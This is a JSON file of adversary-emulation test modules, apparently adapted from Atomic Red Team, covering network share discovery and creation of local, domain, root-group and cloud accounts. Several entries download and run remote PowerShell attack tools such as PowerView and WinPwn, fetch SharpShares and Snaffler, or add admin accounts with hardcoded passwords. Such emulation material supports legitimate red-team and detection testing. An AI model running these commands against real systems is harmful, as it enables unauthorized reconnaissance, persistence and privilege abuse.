        {
          "name": "package_installer",
          "description": "Package installer command. pkg install -y samba413",
          "type": "string",
          "default_value": "(which pkg && pkg install -y samba413)"
        }
      ],
      "prerequisites": [
        {
          "description": "Package with smbstatus (samba) must exist on device\n",
          "check_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
          "install_command": "#{package_installer} \n"
        }
      ],
      "rx_module_id": "77e468a6-3e5c-45a1-9948-c4b5603747cb",
      "module_name": "Network Share Discovery - FreeBSD"
    },
    {
      "index": 851,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution available network shares will be displayed in the powershell session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net view \\\\#{computer_name}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_name",
          "description": "Computer name to find a mount on.",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "20f1097d-81c1-405c-8380-32174d493bbb",
      "module_name": "Network Share Discovery command prompt"
    },
    {
      "index": 852,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, available network shares will be displayed in the powershell session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "get-smbshare\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1b0814d1-bb24-402d-9615-1b20c50733fb",
      "module_name": "Network Share Discovery PowerShell"
    },
    {
      "index": 853,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "View information about all of the resources that are shared on the local computer Upon execution, available share drives will be displayed in the powershell session",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net share\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ab39a04f-0c93-4540-9ff2-83f862c385ae",
      "module_name": "View available share drives"
    },
    {
      "index": 854,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Endpoint must be joined to domain\n",
          "check_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
          "install_command": "\"Join system to domain\"\n"
        }
      ],
      "rx_module_id": "b1636f0a-ba82-435c-b699-0d78794d8bfd",
      "module_name": "Share Discovery with PowerView"
    },
    {
      "index": 855,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Import-Module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nInvoke-ShareFinder #{parameters}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "parameters",
          "description": "ShareFinder parameter",
          "type": "string",
          "default_value": "-CheckShareAccess"
        }
      ],
      "prerequisites": [
        {
          "description": "Invoke-ShareFinder module must exist in %TEMP% directory",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
        }
      ],
      "rx_module_id": "d07e4cc1-98ae-447e-9d31-36cb430d28c4",
      "module_name": "PowerView ShareFinder"
    },
    {
      "index": 856,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network share enumeration using the shareenumeration function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "987901d1-5b87-4558-a6d9-cffcabc638b8",
      "module_name": "WinPwn - shareenumeration"
    },
    {
      "index": 857,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution available network shares will be displayed in the commandline session\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "dir \\\\#{computer_ip}\\c$\ndir \\\\#{computer_ip}\\admin$\ndir \\\\#{computer_ip}\\IPC$\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "computer_ip",
          "description": "Computer IP to find a mount on.",
          "type": "string",
          "default_value": "127.0.0.1"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "13daa2cf-195a-43df-a8bd-7dd5ffb607b5",
      "module_name": "Network Share Discovery via dir command"
    },
    {
      "index": 858,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "SharpShares is a command line tool that can be integrated with Cobalt Strike's execute-assembly module, allowing for the enumeration of network shares. \nThis technique has been utilized by various ransomware groups, including BianLian.\n[Reference](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c '#{sharp_path}' /ldap:all | out-file -filepath \"#{output_path}\"",
        "elevation_required": false,
        "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue"
      },
      "variables": [
        {
          "name": "output_path",
          "description": "File to output enumeration results to",
          "type": "String",
          "default_value": "$env:temp\\T1135SharpSharesOutput.txt"
        },
        {
          "name": "sharp_path",
          "description": "Path to the SharpShares executable",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpShares.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The SharpShares executable must exist on disk",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpShares.exe\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/mitchmoser/SharpShares/releases/download/v2.4/SharpShares.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\SharpShares.exe\""
        }
      ],
      "rx_module_id": "d1fa2a69-b0a2-4e8a-9112-529b00c19a41",
      "module_name": "Enumerate All Network Shares with SharpShares"
    },
    {
      "index": 859,
      "technique_id": "T1135",
      "technique_name": "Network Share Discovery",
      "description": "Snaffler is an open-source tool that has been used by various threat groups, including Scattered Spider/Muddled Libra, to enumerate accessible shares and credential-containing files within a domain. \n[Reference](https://unit42.paloaltonetworks.com/muddled-libra/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "invoke-expression 'cmd /c start powershell -command { cmd /c \"#{snaffler_path}\" -a -o \"#{output_path}\" }; start-sleep 90; stop-process -name \"snaffler\"'\n",
        "elevation_required": false,
        "cleanup_command": "remove-item \"#{output_path}\" -force -erroraction silentlycontinue"
      },
      "variables": [
        {
          "name": "output_path",
          "description": "File to output enumeration results to",
          "type": "String",
          "default_value": "$env:temp\\T1135SnafflerOutput.txt"
        },
        {
          "name": "snaffler_path",
          "description": "Path to the Snaffler executable",
          "type": "String",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\Snaffler.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The Snaffler executable must exist on disk",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Snaffler.exe\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/SnaffCon/Snaffler/releases/download/1.0.150/Snaffler.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Snaffler.exe\""
        }
      ],
      "rx_module_id": "b19d74b7-5e72-450a-8499-82e49e379d1a",
      "module_name": "Enumerate All Network Shares with Snaffler"
    },
    {
      "index": 860,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Create a user via useradd\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd -M -N -r -s /bin/bash -c evil_account #{username}\n",
        "elevation_required": true,
        "cleanup_command": "userdel #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "evil_user"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "40d8eabd-e394-46f6-8785-b9bfa1d011d2",
      "module_name": "Create a user account on a Linux system"
    },
    {
      "index": 861,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Create a user via pw\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account\n",
        "elevation_required": true,
        "cleanup_command": "rmuser -y #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "evil_user"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a39ee1bc-b8c1-4331-8e5f-1859eb408518",
      "module_name": "Create a user account on a FreeBSD system"
    },
    {
      "index": 862,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a user on a MacOS system with dscl\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "dscl . -create /Users/#{username}\ndscl . -create /Users/#{username} UserShell /bin/zsh\ndscl . -create /Users/#{username} RealName \"#{realname}\"\ndscl . -create /Users/#{username} UniqueID \"1010\"\ndscl . -create /Users/#{username} PrimaryGroupID 80\ndscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}\n",
        "elevation_required": true,
        "cleanup_command": "dscl . -delete /Users/#{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "evil_user"
        },
        {
          "name": "realname",
          "description": "'realname' to record when creating the user",
          "type": "string",
          "default_value": "Evil Account"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "01993ba5-1da3-4e15-a719-b690d4f0f0b2",
      "module_name": "Create a user account on a MacOS system"
    },
    {
      "index": 863,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user /add \"#{username}\" \"#{password}\"\n",
        "elevation_required": true,
        "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "T1136.001_CMD"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "T1136.001_CMD!"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6657864e-0323-4206-9344-ac9cd7265a4f",
      "module_name": "Create a new user in a command prompt"
    },
    {
      "index": 864,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-LocalUser -Name \"#{username}\" -NoPassword\n",
        "elevation_required": true,
        "cleanup_command": "Remove-LocalUser -Name \"#{username}\" -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "T1136.001_PowerShell"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "bc8be0ac-475c-4fbf-9b1d-9fffd77afbde",
      "module_name": "Create a new user in PowerShell"
    },
    {
      "index": 865,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "useradd -g 0 -M -d /root -s /bin/bash #{username}\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"#{username}:#{password}\" | sudo chpasswd; else echo \"#{password}\" | passwd --stdin #{username}; fi;\n",
        "elevation_required": true,
        "cleanup_command": "userdel #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "butter"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "BetterWithButter"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a1040a30-d28b-4eda-bd99-bb2861a4616c",
      "module_name": "Create a new user in Linux with `root` UID and GID."
    },
    {
      "index": 866,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n",
        "elevation_required": true,
        "cleanup_command": "pw userdel #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "butter"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "BetterWithButter"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a",
      "module_name": "Create a new user in FreeBSD with `root` GID."
    },
    {
      "index": 867,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new admin user in a command prompt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user /add \"#{username}\" \"#{password}\"\nnet localgroup administrators \"#{username}\" /add\n",
        "elevation_required": true,
        "cleanup_command": "net user /del \"#{username}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "T1136.001_Admin"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "T1136_pass"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fda74566-a604-4581-a4cc-fbbe21d66559",
      "module_name": "Create a new Windows admin user"
    },
    {
      "index": 868,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Creates a new admin user in a powershell session without using net.exe\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2170d9b5-bacd-4819-a952-da76dae0815f",
      "module_name": "Create a new Windows admin user via .NET"
    },
    {
      "index": 869,
      "technique_id": "T1136.001",
      "technique_name": "Create Account: Local Account",
      "description": "Launches a short-lived Alpine pod and creates a Linux user inside the pod.\nThe pod is automatically deleted after execution.\n",
      "execution": {
        "platforms": [
          "containers"
        ],
        "executor_type": "bash",
        "command": "kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "pod_name",
          "description": "K8s pod_name to execute the command in",
          "type": "string",
          "default_value": "raglox-linux-useradd"
        },
        {
          "name": "username",
          "description": "Username of the user to create inside the pod",
          "type": "string",
          "default_value": "evil_user"
        },
        {
          "name": "image_name",
          "description": "Name of the docker image",
          "type": "string",
          "default_value": "alpine"
        }
      ],
      "prerequisites": [
        {
          "description": "kubectl must be installed and configured",
          "check_command": "which kubectl\n",
          "install_command": "echo \"kubectl must be installed manually\"\n"
        }
      ],
      "rx_module_id": "d9efa6c7-6518-42b2-809a-4f2a8e242b9b",
      "module_name": "Create a Linux user via kubectl in a Pod"
    },
    {
      "index": 870,
      "technique_id": "T1136.002",
      "technique_name": "Create Account: Domain Account",
      "description": "Creates a new domain admin user in a command prompt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user \"#{username}\" \"#{password}\" /add /domain\nnet group \"#{group}\" \"#{username}\" /add /domain\n",
        "elevation_required": false,
        "cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "T1136.002_Admin"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "T1136_pass123!"
        },
        {
          "name": "group",
          "description": "Domain administrator group to which add the user to",
          "type": "string",
          "default_value": "Domain Admins"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "fcec2963-9951-4173-9bfa-98d8b7834e62",
      "module_name": "Create a new Windows domain admin user"
    },
    {
      "index": 871,
      "technique_id": "T1136.002",
      "technique_name": "Create Account: Domain Account",
      "description": "Create a new account similar to ANONYMOUS LOGON in a command prompt.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net user \"#{username}\" \"#{password}\" /add /domain\n",
        "elevation_required": false,
        "cleanup_command": "net user \"#{username}\" >nul 2>&1 /del /domain\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the user to create",
          "type": "string",
          "default_value": "ANONYMOUS  LOGON"
        },
        {
          "name": "password",
          "description": "Password of the user to create",
          "type": "string",
          "default_value": "T1136_pass123!"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "dc7726d2-8ccb-4cc6-af22-0d5afb53a548",
      "module_name": "Create a new account similar to ANONYMOUS LOGON"
    },
    {
      "index": 872,
      "technique_id": "T1136.002",
      "technique_name": "Create Account: Domain Account",
      "description": "Creates a new Domain User using the credentials of the Current User\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n",
        "elevation_required": false,
        "cleanup_command": "cmd /c \"net user #{username} /del >nul 2>&1\"\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Name of the Account to be created",
          "type": "string",
          "default_value": "T1136.002_Admin"
        },
        {
          "name": "password",
          "description": "Password of the Account to be created",
          "type": "string",
          "default_value": "T1136_pass123!"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5a3497a4-1568-4663-b12a-d4a5ed70c7d7",
      "module_name": "Create a new Domain Account using PowerShell"
    },
    {
      "index": 873,
      "technique_id": "T1136.002",
      "technique_name": "Create Account: Domain Account",
      "description": "Use Admin Credentials to Create A Domain Admin Account\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\\nchangetype: add\\nobjectClass: top\\nobjectClass: person\\nobjectClass: organizationalPerson\\nobjectClass: user\\ncn: Admin User\\nsn: User\\ngivenName: RAGLOX User\\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\\nsAMAccountName: adminuser\\nuserAccountControl: 512\\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
        "elevation_required": false,
        "cleanup_command": "echo removing RAGLOX User (temporary user)\necho \"dn: cn=RAGLOX User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n"
      },
      "variables": [
        {
          "name": "domain",
          "description": "The domain to be tested",
          "type": "string",
          "default_value": "example"
        },
        {
          "name": "top_level_domain",
          "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
          "type": "string",
          "default_value": "test"
        },
        {
          "name": "admin_user",
          "description": "username@domain of a user with admin privileges",
          "type": "string",
          "default_value": "admin@example.test"
        },
        {
          "name": "admin_password",
          "description": "password of the user with admin privileges referenced in admin_user",
          "type": "string",
          "default_value": "s3CurePssw0rD!"
        },
        {
          "name": "domain_controller",
          "description": "Name of the domain_controller machine, defined in etc/hosts",
          "type": "string",
          "default_value": "adVM"
        }
      ],
      "prerequisites": [
        {
          "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available\n",
          "check_command": "which ldapadd && which ldapmodify\n",
          "install_command": "echo ldapadd or ldapmodify not found; exit 1\n"
        }
      ],
      "rx_module_id": "562aa072-524e-459a-ba2b-91f1afccf5ab",
      "module_name": "Active Directory Create Admin Account"
    },
    {
      "index": 874,
      "technique_id": "T1136.002",
      "technique_name": "Create Account: Domain Account",
      "description": "Use Admin Credentials to Create A Normal Account (as means of entry)\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo \"dn: cn=RAGLOX User, cn=Users,dc=#{domain},dc=#{top_level_domain}\\nobjectClass: person\\ncn: RAGLOX User\\nsn: User\" > tempadmin.ldif\necho ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\nldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif\n",
        "elevation_required": false,
        "cleanup_command": "echo removing RAGLOX User (temporary user)\necho \"dn: cn=RAGLOX User,cn=Users,dc=scwxscratch,dc=dev\\nchangetype: delete\" > deleteuser.ldif\nldapmodify -H ldap://#{domain_controller}:389 -x -D #{admin_user} -w #{admin_password} -f deleteuser.ldif\nrm deleteuser.ldif\nrm tempadmin.ldif\n"
      },
      "variables": [
        {
          "name": "domain",
          "description": "The domain to be tested",
          "type": "string",
          "default_value": "example"
        },
        {
          "name": "top_level_domain",
          "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
          "type": "string",
          "default_value": "test"
        },
        {
          "name": "admin_user",
          "description": "username@domain of a user with admin privileges",
          "type": "string",
          "default_value": "user@example.test"
        },
        {
          "name": "admin_password",
          "description": "password of the user",
          "type": "string",
          "default_value": "s3CurePssw0rD!"
        },
        {
          "name": "domain_controller",
          "description": "Name of the domain_controller machine, defined in etc/hosts",
          "type": "string",
          "default_value": "adVM"
        }
      ],
      "prerequisites": [
        {
          "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapadd, ldapmodify\n",
          "check_command": "which ldapadd\nwhich ldapmodify\n",
          "install_command": "echo ldapadd or ldapmodify not found; exit 1\n"
        }
      ],
      "rx_module_id": "8c992cb3-a46e-4fd5-b005-b1bab185af31",
      "module_name": "Active Directory Create User Account (Non-elevated)"
    },
    {
      "index": 875,
      "technique_id": "T1136.003",
      "technique_name": "Create Account: Cloud Account",
      "description": "Creates a new IAM user in AWS. Upon successful creation, a new user will be created. Adversaries create new IAM users so that their malicious activity do not interupt the normal functions of the compromised users and can remain undetected for a long time\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws iam create-user --user-name #{username}\n",
        "elevation_required": false,
        "cleanup_command": "aws iam delete-user --user-name #{username}\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Username of the IAM user to create in AWS",
          "type": "string",
          "default_value": "raglox"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "8d1c2368-b503-40c9-9057-8e42f21c58ad",
      "module_name": "AWS - Create a new IAM user"
    },
    {
      "index": 876,
      "technique_id": "T1136.003",
      "technique_name": "Create Account: Cloud Account",
      "description": "Creates a new user in Azure AD. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "Connect-AzureAD\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\n$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile\n$PasswordProfile.Password = $password\nNew-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username      ",
        "elevation_required": false,
        "cleanup_command": "Remove-AzureADUser -ObjectId \"#{userprincipalname}\""
      },
      "variables": [
        {
          "name": "username",
          "description": "Display name of the new user to be created in Azure AD",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "userprincipalname",
          "description": "User principal name (UPN) for the new Azure user being created format email address",
          "type": "string",
          "default_value": "raglox@yourdomain.com"
        },
        {
          "name": "password",
          "description": "Password for the new Azure AD user being created",
          "type": "string",
          "default_value": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if AzureAD PowerShell module is installed",
          "check_command": "Get-InstalledModule -Name AzureAD",
          "install_command": "echo \"use the following to install AzureAD PowerShell module - Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force\""
        },
        {
          "description": "Check if AzureAD PowerShell module is installed",
          "check_command": "Update the input arguments so the userprincipalname value is accurate for your environment",
          "install_command": "echo \"Update the input arguments in the .yaml file so that the userprincipalname value is accurate for your environment\""
        }
      ],
      "rx_module_id": "e62d23ef-3153-4837-8625-fa4a3829134d",
      "module_name": "Azure AD - Create a new user"
    },
    {
      "index": 877,
      "technique_id": "T1136.003",
      "technique_name": "Create Account: Cloud Account",
      "description": "Creates a new user in Azure AD via the Azure CLI. Upon successful creation, a new user will be created. Adversaries create new users so that their malicious activity does not interrupt the normal functions of the compromised users and can remain undetected for a long time.",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "az login\n$userprincipalname = \"#{userprincipalname}\"\n$username = \"#{username}\"      \n$password = \"#{password}\"\naz ad user create --display-name $username --password $password --user-principal-name $userprincipalname\naz ad user list --filter \"displayname eq 'raglox'\"     ",
        "elevation_required": false,
        "cleanup_command": "az ad user delete --id \"#{userprincipalname}\""
      },
      "variables": [
        {
          "name": "username",
          "description": "Display name of the new user to be created in Azure AD",
          "type": "string",
          "default_value": "raglox"
        },
        {
          "name": "userprincipalname",
          "description": "User principal name (UPN) for the new Azure user being created format email address",
          "type": "string",
          "default_value": "raglox@yourdomain.com"
        },
        {
          "name": "password",
          "description": "Password for the new Azure AD user being created",
          "type": "string",
          "default_value": "reallylongcredential12345ART-ydsfghsdgfhsdgfhgsdhfg"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if Azure CLI is installed and install manually",
          "check_command": "az account list",
          "install_command": "echo \"use the following to install the Azure CLI manually https://aka.ms/installazurecliwindows\""
        },
        {
          "description": "Check if Azure CLI is installed and install via PowerShell",
          "check_command": "az account list",
          "install_command": "echo \"use the following to install the Azure CLI $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri https://aka.ms/installazurecliwindows -OutFile .\\AzureCLI.msi; Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet'; Remove-Item .\\AzureCLI.msi\""
        },
        {
